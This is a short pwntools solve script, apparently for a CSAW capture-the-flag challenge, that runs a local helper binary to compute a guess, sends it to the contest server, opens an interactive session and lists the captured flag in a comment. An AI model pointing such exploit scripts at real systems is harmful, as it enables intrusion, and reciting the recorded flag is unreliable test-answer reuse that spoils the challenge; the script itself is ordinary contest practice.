from pwn import *
from subprocess import *

io = remote("pwn.chal.csaw.io", 5002)
guess = check_output(["./guess"])
io.sendline(guess)
io.interactive()

# flag{4lw4YS_r3m3mB3R_2_ch3CK_UR_st4cks}
